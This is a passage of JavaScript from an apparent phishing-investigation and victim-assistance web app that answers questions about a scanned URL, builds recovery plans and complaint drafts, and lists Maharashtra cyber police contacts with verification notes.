      const k={v_password:['password'],v_otp:['otp'],v_card:['card'],v_bank:['bank'],v_upi:['upi'],v_identity:['pan']}[intent];urgent=k[0]!=='password'&&k[0]!=='pan';src='built-in recovery guidance';
      html=`<p><b>You're not alone — let's secure this step by step.</b> Never type the secret itself here.</p>${planHTML(k)}${acts(...(urgent?[CALL]:[]),btn('FULL RECOVERY PLAN','data-go="protection"'),btn('PREPARE COMPLAINT','data-go="complaint"'))}`;break}
    case'whatnow':src='built-in guidance';html=`<p><b>Take a breath. We can work through this step by step.</b></p><p>Tell me what was shared — for example “I entered my password” or “I gave an OTP” — or tick the categories in the Incident Response Center for a personalised plan.</p>${s.h?`<p>On the current target (${esc(s.h.host)}): risk ${s.score}/100, confidence ${s.conf}%.</p>`:''}${acts(btn('🚨 INCIDENT RESPONSE CENTER','data-go="protection"','red'),CALL)}`;break;
    case'hosting':{
      if(!s.h){html=needScan();break}
      if(!s.infra?.ok)await fresh(ensure.infra);
      const i=s.infra;
      if(i?.ok)html=`<p><b>${esc(s.h.host)}</b> resolves to <b>${esc(i.ip)}</b>.</p>${li([i.org||i.isp?'Organisation / ISP: '+esc(i.org||i.isp):null,i.asn?'ASN: '+esc(i.asn):null,[i.city,i.region,i.country].filter(Boolean).length?'Server location: '+esc([i.city,i.region,i.country].filter(Boolean).join(', ')):null,i.rdns?'Reverse DNS: '+esc(i.rdns):null].filter(Boolean))}<p class="sub">This describes where the server sits, not who runs the site. Hosting provider or country is context, never proof of intent. (Source: ${esc(i.source||'IP lookup')}.)</p>`;
      else html=unverified('Look up the IP on a regional internet registry / ASN lookup tool such as bgp.he.net.',s.dns?.ok&&!s.dns.nx?'DNS resolved: '+esc([...s.dns.A,...s.dns.AAAA].join(', ')||'no addresses'):s.dns?.nx?'The domain does not currently resolve.':'',esc(i?.error||i?.skipped||'hosting lookup returned no data or is switched off in Settings')+'.','You can still check the registrar and registration data in the Recon tab.','Re-run the investigation or enable IP lookups in Settings.');break}
    case'owner':{
      if(!s.h){html=needScan();break}
      if(!s.rdap?.ok)await fresh(ensure.rdap);
      const r=s.rdap;
      if(r?.ok){const days=r.created?Math.max(0,Math.floor((Date.now()-new Date(r.created))/864e5)):null;html=`<p>Registration record for <b>${esc(s.h.reg)}</b>:</p>${li([r.created?'Domain created: '+esc(fmtDay(r.created))+(days!=null?' ('+days+' days ago)':''):'No creation event returned',r.registrar?'Registrar: '+esc(r.registrar):null,'Registrant: '+esc(r.registrant||'not public / redacted'),r.status?.length?'Status: '+esc(r.status.join(', ')):null].filter(Boolean))}<p class="sub">Registrant data is usually redacted and is not identity evidence. A creation date is not the date the site was published.</p>`}
      else html=unverified('Search the domain at lookup.icann.org (official RDAP lookup).','',esc(r?.error||r?.skipped||'registration lookup returned no data')+'.','Registrar and name-server information may still appear in the DNS section.','Try the ICANN lookup link above, then re-run the scan.');break}
    case'reported':{
      if(!s.h){html=needScan();break}
      if(!s.ti)await fresh(ensure.ti);
      const m=s.ti?.matches||[],used=(s.ti?.sources||[]).filter(x=>x.state==='consulted').map(x=>x.name),unused=(s.ti?.sources||[]).filter(x=>x.state!=='consulted').map(x=>x.name);
      if(m.length)html=`<p><b>Yes — ${m.length} finding(s) from consulted sources:</b></p>${li(m.slice(0,6).map(x=>`${esc(x.matchType)} · ${esc(x.source)} — ${esc(x.result)}`))}<p class="sub">Only the listed sources were checked.</p>`;
      else if(used.length)html=`<p>No match was returned by: ${esc(used.join(', '))}.</p><p class="sub">That is not proof the site is safe. ${unused.length?'Not consulted: '+esc(unused.join(', '))+'.':''} New sites are often not listed yet.</p>`;
      else html=unverified('Search the exact URL on Google Safe Browsing Transparency Report, PhishTank, URLhaus and VirusTotal.','',`no threat-intelligence source could be consulted${unused.length?' ('+esc(unused.join(', '))+')':''}.`,'The page behaviour and DNS evidence are still available.','Use the manual links above, or connect the optional backend with API keys.');
      html+=acts(btn('THREAT INTEL TAB','data-go="threats"'));break}
    case'steal':{
      if(!s.h){html=needScan('Generally, a phishing page can collect whatever its forms ask for.');break}
      const set=new Set(),p=s.page;
      (s.patterns||[]).slice(0,4).forEach(x=>{const n=x.name;if(/Credential|Corporate|Social|verification/.test(n))set.add('login credentials');if(/Banking/.test(n)){set.add('net-banking credentials');set.add('card details');set.add('OTP')}if(/UPI/.test(n)){set.add('UPI PIN / payment details')}if(/Identity|Government|Loan/.test(n)){set.add('Aadhaar / PAN / ID documents')}if(/Cryptocurrency|Investment/.test(n)){set.add('wallet seed phrase / payments')}if(/Malware/.test(n))set.add('device access via a downloaded file')});
      if(p?.passwordFields)set.add('passwords (a password field is present)');
      html=set.size?`<p>Based on the observed indicators, a page like this <b>could</b> try to collect: ${[...set].map(esc).join(', ')}.</p><p class="sub">This is inference from patterns, not proof of what this particular page does. Never enter ${'passwords, OTPs, PINs, CVVs'} unless you are certain of the site.</p>`:`<p>I can't establish what this page collects. No form or pattern evidence was captured (${p?'page inspected':'page not inspected'}).</p><p class="sub">Paste the page source in the Page Behaviour tab for a form-level answer.</p>${acts(btn('PAGE BEHAVIOUR','data-go="behaviour"'))}`;break}
    case'trust':
      if(!a){html=needScan();break}
      html=`<p>I can't certify any site as safe. Here's what the evidence says: <b>${esc(a.verdict)}</b> (risk ${a.score}/100, confidence ${a.conf}%).</p>${a.conf<50?'<p><b>Insufficient evidence for a confident determination.</b></p>':''}${li(a.actions.slice(0,3).map(esc))}`;break;
    case'scamtype':
      if(!s.h){html=needScan();break}
      html=s.patterns.length?`<p>Possible scam patterns (not established as fact):</p>${li(s.patterns.slice(0,5).map(p=>'<b>POSSIBLE SCAM PATTERN</b> — '+esc(p.name)+' ('+strength(p.hits)+': '+esc(p.sample.join(', '))+')'))}`:'<p>No specific scam pattern could be established from the available evidence.</p>';break;
    case'dns':{
      if(!s.h){html=needScan();break}
      const d=s.dns;
      html=d?.ok?`<p>DNS for <b>${esc(s.h.host)}</b>:</p>${li(['A / AAAA: '+esc([...d.A,...d.AAAA].join(', ')||'none'),'MX: '+esc(d.MX.join(', ')||'none'),'NS: '+esc(d.NS.join(', ')||'none'),'SPF: '+(d.SPF?'published':'not found'),'DMARC: '+(d.DMARC?'published':'not found')])}<p class="sub">Missing mail policies are weak context only.</p>`:unverified('Query the domain with a public DNS tool (for example dig / nslookup).','','DNS data was not retrieved ('+esc(d?.error||d?.skipped||'switched off')+').','','Re-run the investigation.');break}
    case'report':src='built-in guidance';html=`<p><b>Reporting routes (India):</b></p>${ol(['<b>Call 1930</b> if money was lost or at risk.','Report online at <b>cybercrime.gov.in</b> (National Cyber Crime Reporting Portal) — the same portal has suspect-reporting options.','Visit or contact your nearest cyber police station — see the Maharashtra / Mumbai directory (confirm numbers first).','Report the phishing page to the impersonated brand and to the browser vendor’s phishing-report form.'])}<p class="sub">I can prepare a draft for you to review. I never submit anything on your behalf.</p>${acts(CALL,PORTAL,btn('CYBER POLICE DIRECTORY','data-go="help"'),btn('PREPARE COMPLAINT','data-go="complaint"'))}`;break;
    case'evidence':src='built-in guidance';html=`<p><b>Save these before deleting anything:</b></p>${li(['The suspicious URL and screenshots of the page','Emails, SMS, WhatsApp messages and the sender numbers / addresses','Transaction IDs, UTR / reference numbers and bank or payment records','Timestamps of each event','Social-media profiles or phone numbers involved','Any downloaded file (don’t open it)','Relevant call logs and conversation history'])}${acts(btn('EVIDENCE CHECKLIST','data-go="complaint"'),btn('PREPARE COMPLAINT','data-go="complaint"'))}`;break;
    case'hello':src='built-in';html=`<p>Hello. I'm CyberGuard AI. Ask about the current investigation, or tell me what happened if you already interacted with a suspicious site.</p>`;break;
    case'why':default:
      if(!a){src='built-in guidance';html=`<p>I can help in two ways:</p>${li(['<b>Investigate</b> a suspicious link — paste it in the Investigate tab, then ask me questions about it.','<b>Recover</b> if you already entered information — tell me what was shared (never the secret itself).'])}${acts(btn('INVESTIGATE A URL','data-go="investigate"'),btn('🚨 I ALREADY ENTERED INFO','data-go="protection"','red'))}`;break}
      html=`<p><b>${esc(a.verdict)}</b> — risk ${a.score}/100, confidence ${a.conf}%.</p>${a.conf<50?'<p><b>Insufficient evidence for a confident determination.</b></p>':''}<p>${esc(intent==='why'?'Why:':'Summary:')}</p>${li((a.why.length?a.why:['No strong warning cluster was observed.']).slice(0,6).map(x=>esc(x)))}<p class="sub">Unknown: ${esc(a.unknown[0]||'')}</p>${acts(btn('FULL REPORT','data-go="report"'))}`;
  }
  return{html,urgent,calls,src};
}
async function ask(q){
  q=String(q||'').trim();if(!q||chatBusy)return;
  const inp=$('#chatIn');
  if(looksSensitive(q)){addMsg('user','<i>(message blocked)</i>');const d=addMsg('ai','<b>I blocked that message.</b> It looked like it contained a password, OTP, PIN, CVV or card number. Never share those with me or anyone. Tell me <i>what kind</i> of information was exposed instead (for example “I entered my password”).','urgent');inp.value='';return}
  chatBusy=true;$('#chatSend').disabled=true;inp.value='';
  addMsg('user',esc(q));chatHist.push({role:'user',text:q});
  const intent=detectIntent(q);
  chatMode=intent==='emergency'?'EMERGENCY':/^v_|whatnow/.test(intent)?'VICTIM':chatMode==='NORMAL'?'NORMAL':chatMode;if(intent==='emergency'||/^v_/.test(intent)||intent==='whatnow')renderChatCtx();else renderChatCtx();
  const bubble=addMsg('ai','','');bubble.classList.add('caret');
  let res=null,serverText=null;
  if(backend.present&&cfg.backend&&intent!=='emergency'){
    try{const r=await fetchTO(apiUrl('/api/ai'),{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({question:q,intent,history:chatHist.slice(-6),evidence:compactEvidence()})},12000);if(r.ok){const j=await r.json();if(j&&typeof j.answer==='string'&&j.answer.trim())serverText=j.answer}}catch{}
  }
  if(serverText){res={html:'<p>'+esc(serverText).replace(/\n{2,}/g,'</p><p>').replace(/\n/g,'<br>')+'</p>',urgent:false,calls:1,src:'server AI + current evidence'}}
  else res=await localAnswer(intent);
  if(res.urgent)bubble.classList.add('urgent');
  bubble.classList.remove('caret');
  const meta=`<div class="sub" style="margin-top:8px">intent: ${esc(intent)} · source: ${esc(res.src)} · network calls: ${res.calls}</div>`;
  typeHTML(bubble,res.html+meta,()=>{chatBusy=false;$('#chatSend').disabled=false;chatHist.push({role:'ai',text:intent});inp.focus()});
}
ACT['chat-send']=()=>ask($('#chatIn').value);
$('#chatIn').addEventListener('keydown',e=>{if(e.key==='Enter'&&!e.isComposing)ask($('#chatIn').value)});
document.addEventListener('click',e=>{const b=e.target.closest('[data-q]');if(b)ask(b.dataset.q)});
function initChat(){
  $('#quick').innerHTML=QUICK.map(q=>`<button class="chip" data-q="${esc(q)}">${esc(q)}</button>`).join('');
  renderChatCtx();
  const box=$('#msgs');if(!box.children.length){const d=addMsg('ai','');typeHTML(d,`<p><b>CyberGuard AI — 24/7 AI Cybersecurity &amp; Victim Assistance.</b></p><p>Ask about this website, or tell me what happened. If you already entered information, I'll switch to victim-protection mode and keep it step by step. I never need your password, OTP, PIN or CVV.</p>`)}
}
PAGE_HOOKS.ai=initChat;

/* =====================================================================
   INCIDENT RESPONSE · COMPLAINT & EVIDENCE · REPORT · HELP DIRECTORY ·
   PHISH LAB · SETTINGS · INIT
   ===================================================================== */
const chkHTML=(id,items,saved=[])=>items.map(([k,l])=>`<label class="chk"><input type="checkbox" data-grp="${id}" value="${esc(k)}"${saved.includes(k)?' checked':''}>${esc(l)}</label>`).join('');
const picked=g=>$$('input[data-grp="'+g+'"]:checked').map(x=>x.value);

/* ---------- Incident Response Center ---------- */
const IR_FLOW=['PANIC','CALM','UNDERSTAND','SECURE','REPORT','RECOVER'];
let irKeys=[];
function setFlow(n){$$('#irFlow span').forEach((s,i)=>s.classList.toggle('on',i<=n))}
function renderIR(){
  if(!$('#exposure').children.length)$('#exposure').innerHTML=chkHTML('exp',EXPOSURE);
  if(!irKeys.length)setFlow(0);
}
function irDone(){return LS.get('irdone',[])}
function paintPlan(){
  const groups=planFor(irKeys),done=new Set(irDone());let total=0,n=0;
  $('#irPlan').innerHTML=groups.map(g=>`<div><div class="ct" style="${g.urgent?'color:var(--red)':''}">${esc(g.t)}${g.urgent?' — priority':''}</div>${g.steps.map((t,i)=>{const id=g.k+':'+i;total++;if(done.has(id))n++;return `<label class="step ${g.urgent?'urgent':''} ${done.has(id)?'done':''}"><input type="checkbox" data-ir="${id}" ${done.has(id)?'checked':''}><div><div class="st-t">${esc(t)}</div></div></label>`}).join('')}</div>`).join('')+`<div><div class="ct">Always</div>${['Preserve evidence: URL, screenshots, messages, numbers, transaction IDs.','Report: call 1930 if money is involved, and file at cybercrime.gov.in.'].map((t,i)=>{const id='all:'+i;total++;if(done.has(id))n++;return `<label class="step ${done.has(id)?'done':''}"><input type="checkbox" data-ir="${id}" ${done.has(id)?'checked':''}><div><div class="st-t">${esc(t)}</div></div></label>`}).join('')}</div>`;
  const pct=total?Math.round(n/total*100):0;$('#irBar').style.width=pct+'%';
  $('#irSummary').textContent=`${groups.length} exposure categor${groups.length===1?'y':'ies'} · ${n} of ${total} steps done (${pct}%). Work top to bottom — the first group is the most time-sensitive.`;
  setFlow(pct>=100?5:pct>=50?4:pct>0?3:2);
}
ACT['ir-build']=()=>{
  irKeys=picked('exp');
  if(!irKeys.length){toast('Tick at least one category first — or call 1930 if money is involved.');return}
  const urgent=irKeys.some(k=>['otp','bank','card','upi'].includes(k));
  $('#irUrgent').innerHTML=urgent?`<div class="card red"><div class="ct" style="color:var(--red)">Urgent — payment or banking information may be at risk</div><p style="margin:0 0 10px">Call <b>1930</b> and your bank / payment provider through an <b>official</b> number first. The rest of the plan can wait a few minutes; these calls can’t.</p><div class="row-actions"><a class="btn red" href="tel:1930">📞 CALL 1930 NOW</a><a class="btn" href="https://cybercrime.gov.in/" target="_blank" rel="noopener">REPORT ONLINE ↗</a></div></div>`:'';
  $('#irActs').style.display='';paintPlan();$('#irPlan').scrollIntoView({behavior:reduced?'auto':'smooth',block:'start'});
};
ACT['ir-clear']=()=>{irKeys=[];$$('input[data-grp="exp"]').forEach(x=>x.checked=false);$('#irPlan').innerHTML='';$('#irUrgent').innerHTML='';$('#irActs').style.display='none';LS.del('irdone');$('#irBar').style.width='0%';$('#irSummary').textContent='Select what was exposed, then build your plan. Tick steps off as you complete them.';setFlow(0)};
ACT['ir-copy']=()=>copyText('CYBERGUARD AI — RECOVERY PLAN\n\n'+planFor(irKeys).map(g=>g.t.toUpperCase()+'\n'+g.steps.map((s,i)=>(i+1)+'. '+s).join('\n')).join('\n\n')+'\n\nAlways: preserve evidence; call 1930 if money is involved; report at https://www.cybercrime.gov.in/','Plan copied');
document.addEventListener('change',e=>{const c=e.target.closest('input[data-ir]');if(!c)return;const d=new Set(irDone());c.checked?d.add(c.dataset.ir):d.delete(c.dataset.ir);LS.set('irdone',[...d]);paintPlan()});
PAGE_HOOKS.protection=renderIR;

/* ---------- Complaint & evidence ---------- */
const EVID=[['url','Suspicious URL / link'],['shots','Screenshots of the page, chat or app'],['email','Emails (with full headers if possible)'],['sms','SMS messages'],['wa','WhatsApp / Telegram messages'],['nums','Phone numbers and email addresses used'],['txn','Transaction IDs / UTR / reference numbers'],['bank','Bank / payment records or statements'],['time','Timestamps of each event'],['social','Social-media profiles involved'],['files','Downloaded files (not opened)'],['calls','Call logs / conversation history']];
let cpUseScan=false;
function initComplaint(){
  if(!$('#cp-exposed').children.length){$('#cp-exposed').innerHTML=chkHTML('cpx',EXPOSURE.map(x=>[x[0],x[1]]),irKeys);$('#evChecks').innerHTML=chkHTML('evc',EVID,LS.get('evc',[]))}
  if(!$('#cp-dt').value){const d=new Date();d.setMinutes(d.getMinutes()-d.getTimezoneOffset());$('#cp-dt').value=d.toISOString().slice(0,16)}
}
document.addEventListener('change',e=>{if(e.target.matches('input[data-grp="evc"]'))LS.set('evc',picked('evc'))});
ACT['cp-prefill']=()=>{if(!state.h){toast('No investigation loaded yet.');return}$('#cp-url').value=state.h.url;cpUseScan=true;const x=irKeys.length?irKeys:[];$$('input[data-grp="cpx"]').forEach(c=>{if(x.includes(c.value))c.checked=true});toast('URL filled. The automated scan note will be included as an indicator only.')};
ACT['cp-build']=()=>{
  const f={dt:$('#cp-dt').value,url:$('#cp-url').value.trim(),how:$('#cp-how').value,what:$('#cp-what').value.trim(),loss:$('#cp-loss').value.trim(),txn:$('#cp-txn').value.trim(),sus:$('#cp-suspect').value.trim(),act:$('#cp-actions').value.trim()};
  if(looksSensitive(Object.values(f).join(' \n '))){$('#cpOut').textContent='Draft not generated: one of the fields looks like it contains a password, OTP, PIN, CVV or full card number. Remove it (reference/UTR numbers are fine) and try again.';toast('Sensitive-looking text blocked.');return}
  const exp=picked('cpx').map(k=>EXPOSURE.find(x=>x[0]===k)?.[1]).filter(Boolean),np='Not provided';
  const dt=f.dt?fmtDate(f.dt):np;
  let t=`CYBERCRIME COMPLAINT — DRAFT\nPrepared with CyberGuard AI on ${fmtDate(new Date())}. Review every line before submitting. Nothing has been submitted.\n\n1. Incident date / time: ${dt}\n2. Website / link: ${f.url||np}\n3. How I encountered it: ${f.how||np}\n4. What happened:\n${f.what||np}\n\n5. Information I entered or shared (categories only): ${exp.length?exp.join(', '):np}\n6. Financial loss: ${f.loss?'₹ '+f.loss:'None reported / '+np}\n7. Transaction details: ${f.txn||np}\n8. Suspect identifiers: ${f.sus||np}\n9. Evidence available: ${picked('evc').map(k=>EVID.find(x=>x[0]===k)?.[1]).filter(Boolean).join('; ')||np}\n10. Actions already taken: ${f.act||np}\n`;
  if(cpUseScan&&state.h&&state.done)t+=`\nAutomated scan note (indicator only, not proof): CyberGuard AI assessed ${state.h.host} as ${verdictOf(state.score,state.conf).label} (risk ${state.score}/100, confidence ${state.conf}%) on ${fmtDate(state.scanTime)}.\n`;
  t+=`\nDeclaration: The details above are provided by me to the best of my knowledge. Where a field says “Not provided”, I have not supplied that information.\n\nReporting routes: National Cyber Crime Helpline 1930 · https://www.cybercrime.gov.in/`;
  $('#cpOut').textContent=t;
};
ACT['cp-copy']=()=>copyText($('#cpOut').textContent,'Draft copied');
ACT['cp-dl']=()=>download('cybercrime-complaint-draft.txt',$('#cpOut').textContent);
ACT['ev-sum']=()=>{
  const have=picked('evc'),got=EVID.filter(x=>have.includes(x[0])).map(x=>x[1]),miss=EVID.filter(x=>!have.includes(x[0])).map(x=>x[1]);
  const o=$('#evOut');o.style.display='';
  o.textContent=`INCIDENT EVIDENCE CHECKLIST\nCollected (${got.length}/${EVID.length}):\n${got.map(x=>' [x] '+x).join('\n')||' (none ticked yet)'}\n\nStill to collect:\n${miss.map(x=>' [ ] '+x).join('\n')}\n\nTips: take screenshots with the date/time visible; don’t delete messages; don’t open downloaded files; keep transaction records exactly as received.`;
};
PAGE_HOOKS.complaint=initComplaint;

/* ---------- Report ---------- */
const RP_SECTIONS=[['summary','Executive summary'],['risk','Risk & confidence'],['why','Why suspicious'],['evidence','Key evidence'],['ti','Threat intelligence'],['infra','Infrastructure'],['behaviour','Website behaviour'],['scam','Possible scam type'],['known','Known'],['unknown','Unknown'],['actions','Recommended action'],['victim','Victim recovery'],['reporting','Cybercrime reporting'],['sources','Sources consulted']];
function reportData(){
  const a=analyst();if(!a)return null;const s=state;
  return{summary:[a.exec],risk:[`Risk score: ${a.score} / 100 — ${a.verdict}`,`Confidence: ${a.conf}%${a.conf<50?' — Insufficient evidence for a confident determination.':''}`,'Risk and confidence are separate measures.'],why:a.why.length?a.why:['No strong warning cluster observed.'],
    evidence:s.evidence.filter(e=>e.severity!=='Info').slice(0,8).map(e=>`[${e.severity}] ${e.source}: ${e.finding}`),ti:a.ti,infra:a.infra,behaviour:a.behaviour,scam:a.patterns,known:a.known,unknown:a.unknown,actions:a.actions,victim:a.victim,reporting:a.reporting,sources:a.sources};
}
function renderReport(){
  const d=reportData(),s=state;
  $('#rpNav').innerHTML=RP_SECTIONS.map(([k,l])=>`<a href="#rs-${k}" data-rp="${k}">${l.toUpperCase()}</a>`).join('');
  if(!d){$('#rpTitle').textContent='No investigation yet';$('#rpMeta').textContent='Run a scan to generate the report.';$('#rpBody').innerHTML='<div class="empty">Your investigation report will appear here.</div>';return}
  $('#rpTitle').textContent=s.h.host;$('#rpMeta').textContent=`Target ${s.h.url} · scanned ${fmtDate(s.scanTime)} · risk ${s.score}/100 · confidence ${s.conf}%`;
  $('#rpBody').innerHTML=RP_SECTIONS.map(([k,l])=>`<div class="rs" id="rs-${k}" style="margin-top:16px"><h3>${l.toUpperCase()}</h3>${d[k].length>1||k!=='summary'?'<ul>'+d[k].map(x=>'<li>'+esc(x)+'</li>').join('')+'</ul>':'<p>'+esc(d[k][0])+'</p>'}</div>`).join('')+'<div class="note mt">This report is evidence-based and is not proof that the website is fraudulent. Absence of findings is not proof of safety.</div>';
}
document.addEventListener('click',e=>{const a=e.target.closest('[data-rp]');if(a){e.preventDefault();document.getElementById('rs-'+a.dataset.rp)?.scrollIntoView({behavior:reduced?'auto':'smooth'})}});
PAGE_HOOKS.report=renderReport;
function reportText(){const d=reportData();if(!d)return null;return `CYBERGUARD AI — INVESTIGATION REPORT\nTarget: ${state.h.url}\nScanned: ${fmtDate(state.scanTime)}\n\n`+RP_SECTIONS.map(([k,l])=>l.toUpperCase()+'\n'+d[k].map(x=>'- '+x).join('\n')).join('\n\n')+'\n\nThis report is evidence-based and is not proof that the website is fraudulent.'}
ACT['dl-txt']=()=>{const t=reportText();if(!t){toast('Run an investigation first.');return}download('cyberguard-report-'+state.h.host+'.txt',t)};
ACT['dl-json']=()=>{if(!state.h){toast('Run an investigation first.');return}const s=state;download('cyberguard-report-'+s.h.host+'.json',JSON.stringify({target:s.h.url,scanned:s.scanTime,risk:s.score,confidence:s.conf,signals:s.h.flags,evidence:s.evidence,timeline:s.timeline,patterns:s.patterns,known:s.known,unknown:s.unknown,sources:s.consulted},null,2),'application/json')};
ACT.print=()=>{navigate('report');setTimeout(()=>window.print(),150)};

/* ---------- Cybercrime directory ---------- */
const DIR_BUILTIN={"meta": {"version": "2026-10-07", "note": "Edit this file or import it from Settings. Only add numbers/emails you have confirmed with the police or the NCRP directory. verification levels: official = confirmed on the force's own website; cross-checked = matches the project brief and an independent directory; brief-only = taken from the project brief, not independently confirmed.", "officialSites": {"NCRP": "https://www.cybercrime.gov.in/", "Maharashtra Police": "https://www.mahapolice.gov.in/", "Mumbai Police": "https://mumbaipolice.gov.in/"}}, "regions": [{"key": "all", "label": "All Maharashtra"}, {"key": "mumbai", "label": "Mumbai", "lat": 19.076, "lon": 72.8777}, {"key": "thane", "label": "Thane", "lat": 19.2183, "lon": 72.9781}, {"key": "navi-mumbai", "label": "Navi Mumbai", "lat": 19.033, "lon": 73.0297}, {"key": "pune", "label": "Pune", "lat": 18.5204, "lon": 73.8567}, {"key": "nagpur", "label": "Nagpur", "lat": 21.1458, "lon": 79.0882}, {"key": "nashik", "label": "Nashik", "lat": 19.9975, "lon": 73.7898}, {"key": "sambhajinagar", "label": "Chhatrapati Sambhajinagar (Aurangabad)", "lat": 19.8762, "lon": 75.3433}, {"key": "solapur", "label": "Solapur", "lat": 17.6599, "lon": 75.9064}, {"key": "amravati", "label": "Amravati", "lat": 20.9374, "lon": 77.7796}, {"key": "raigad", "label": "Raigad", "lat": 18.6414, "lon": 72.8722}, {"key": "other", "label": "Other Maharashtra districts"}], "entries": [{"id": "mum-bkc", "region": "mumbai", "state": "Maharashtra", "commissionerate": "Mumbai Police", "district": "Mumbai", "name": "Mumbai Cyber Police Station (BKC) — cyber department & 24×7 helpline", "jurisdiction": "Mumbai Police cyber department and cyber helpline", "phones": ["022-26504008", "9820810007"], "email": "cyberpst-mum@mahapolice.gov.in", "address": "First Floor, Bandra-Kurla Complex Road, opposite ICICI Bank, Bandra East, Mumbai 400051", "website": "https://mumbaipolice.gov.in/", "lat": 19.068, "lon": 72.865, "lastVerified": "2026-10-07", "verification": "cross-checked", "source": "Third-party directory listing; 9820810007 appears in an older press report as the 24x7 cyber helpline"}, {"id": "mum-west", "region": "mumbai", "state": "Maharashtra", "commissionerate": "Mumbai Police", "district": "Mumbai", "name": "West Regional Cyber Police Station", "jurisdiction": "Mumbai West region", "phones": ["022-26504008"], "email": "cyberpst-mum@mahapolice.gov.in", "address": "Mumbai Police Cyber Centre, S.V. Road, near Lucky Hotel, Bandra West, Mumbai 400050", "website": "https://mumbaipolice.gov.in/", "lat": 19.0596, "lon": 72.8295, "lastVerified": "2026-10-07", "verification": "brief-only", "source": "Project brief (published by Mumbai Police)", "note": "An independent directory lists the West region station at the BKC address instead. Confirm by phone before travelling."}, {"id": "mum-central", "region": "mumbai", "state": "Maharashtra", "commissionerate": "Mumbai Police", "district": "Mumbai", "name": "Central Regional Cyber Police Station", "jurisdiction": "Mumbai Central region", "phones": ["022-35673226", "8850646135"], "email": "ps.centralcyber.mum@mahapolice.gov.in", "address": "5th Floor, Worli Police Station Compound, Dr. Annie Besant Road, Worli, Mumbai", "website": "https://mumbaipolice.gov.in/", "lat": 19.0176, "lon": 72.818, "lastVerified": "2026-10-07", "verification": "cross-checked", "source": "Project brief; independent directory listing", "note": "The project brief wrote this email with an extra “.dot.” segment; the independent listing shows ps.centralcyber.mum@mahapolice.gov.in. Confirm on the official site before emailing."}, {"id": "mum-south", "region": "mumbai", "state": "Maharashtra", "commissionerate": "Mumbai Police", "district": "Mumbai", "name": "South Regional Cyber Police Station", "jurisdiction": "Mumbai South region", "phones": ["022-23801069", "022-23801070", "8976952608"], "email": "ps.southcyber.mum@mahapolice.gov.in", "address": "D.B. Marg Police Station compound, Bhadkamkar Marg, Lamington Road, Grant Road East, Mumbai 400007", "website": "https://mumbaipolice.gov.in/", "lat": 18.9647, "lon": 72.815, "lastVerified": "2026-10-07", "verification": "cross-checked", "source": "Project brief; independent directory listing", "note": "Email spelling differs from the project brief (extra “.dot.”). Confirm on the official site before emailing."}, {"id": "mum-north", "region": "mumbai", "state": "Maharashtra", "commissionerate": "Mumbai Police", "district": "Mumbai", "name": "North Regional Cyber Police Station", "jurisdiction": "Mumbai North region", "phones": ["022-20891877"], "email": "ps.northcyber.mum@mahapolice.gov.in", "address": "Behind Samta Nagar Police Station, Western Express Highway, Kandivali East, Mumbai 400101", "website": "https://mumbaipolice.gov.in/", "lat": 19.206, "lon": 72.87, "lastVerified": "2026-10-07", "verification": "cross-checked", "source": "Project brief; independent directory listing", "note": "Email spelling differs from the project brief (extra “.dot.”). Confirm on the official site before emailing."}, {"id": "mum-east", "region": "mumbai", "state": "Maharashtra", "commissionerate": "Mumbai Police", "district": "Mumbai", "name": "East Regional Cyber Police Station", "jurisdiction": "Mumbai East region", "phones": ["022-20857044"], "email": null, "address": "Shivaji Nagar Police Station premises, Govandi (location per a press report)", "website": "https://mumbaipolice.gov.in/", "lat": 19.056, "lon": 72.919, "lastVerified": "2026-10-07", "verification": "brief-only", "source": "Project brief", "note": "Phone only. The brief’s email for this station looked mis-formatted and no address was available, so none is shown. Find the current details on the official Mumbai Police site."}, {"id": "nm-cyber", "region": "navi-mumbai", "state": "Maharashtra", "commissionerate": "Navi Mumbai Police", "district": "Navi Mumbai", "name": "Navi Mumbai Cyber Police Station", "jurisdiction": "Navi Mumbai Police Commissionerate", "phones": ["9321599806", "022-27578309"], "email": "cybercell.navimumbai@mahapolice.gov.in", "address": "Sawali Building, 1st Floor, Sector 5, near Dr. D.Y. Patil Hospital, Nerul, Navi Mumbai 400706", "website": "https://navimumbaipolice.gov.in/en/units/cyber-crime-police-station", "lat": 19.033, "lon": 73.019, "lastVerified": "2026-10-07", "verification": "official", "source": "Navi Mumbai Police official unit page (address, phone 9321599806, email); 022-27578309 from a third-party listing", "note": "9321599806 is shown on the official unit page. 022-27578309 appears only in a third-party listing."}, {"id": "mh-dig", "region": "other", "statewide": true, "state": "Maharashtra", "commissionerate": "Maharashtra Cyber (state level)", "district": "Statewide", "name": "Maharashtra State Cyber — DG/IG Cyber office (state cyber nodal contact)", "jurisdiction": "Maharashtra state cyber nodal / grievance contact listed on NCRP", "phones": ["022-22160080"], "email": null, "address": "Cyber, 32nd Floor, Centre One Building, World Trade Centre, Cuffe Parade, Mumbai 400005", "website": "https://www.cybercrime.gov.in/", "lat": 18.9156, "lon": 72.8205, "lastVerified": "2026-10-07", "verification": "official", "source": "Maharashtra Police officer posting directory (mahapolice.gov.in) lists 022-22160080 for the Cyber office", "note": "Current nodal / grievance officer names and e-mails are published on NCRP (cybercrime.gov.in) under Contact Us. Check there rather than relying on this copy."}, {"id": "pune", "region": "pune", "commissionerate": "Pune City Police", "district": "Pune", "name": "Cyber Police Station, Pune City", "jurisdiction": "Pune City", "phones": ["7058719375", "7058719371"], "email": "crimecyber.pune@nic.in", "address": "Pune City Police Headquarters (full address not captured in the listing)", "website": null, "lat": 18.5204, "lon": 73.8567, "lastVerified": "2026-10-07", "verification": "cross-checked", "source": "Third-party directory listing (not an official page)"}, {"id": "raigad", "region": "raigad", "commissionerate": "Raigad District Police", "district": "Raigad", "name": "Cyber Police Station, Raigad (Alibag)", "jurisdiction": "Raigad district", "phones": ["0214-1222028"], "email": "cybercell.raigad@mahapolice.gov.in", "address": "SP Office Raigad, Alibag, near Hirakot Lake, Alibag 402201", "website": null, "lat": 18.6414, "lon": 72.8722, "lastVerified": "2026-10-07", "verification": "cross-checked", "source": "Third-party directory listing (not an official page)", "note": "The phone format in the listing looks odd (possibly 02141-222028). Confirm before calling."}, {"id": "yavatmal", "region": "other", "commissionerate": "Yavatmal District Police", "district": "Yavatmal", "name": "Cyber Police Station, Yavatmal", "jurisdiction": "Yavatmal district", "phones": ["9359293199"], "email": "cybercell.yavatmal@mahapolice.gov.in", "address": "Superintendent of Police Office, L.I.C. Square, Yavatmal 445001", "website": "https://yavatmalpolice.gov.in/pages/cyber-cell-yavatmal", "lat": 20.3888, "lon": 78.1204, "lastVerified": "2026-10-07", 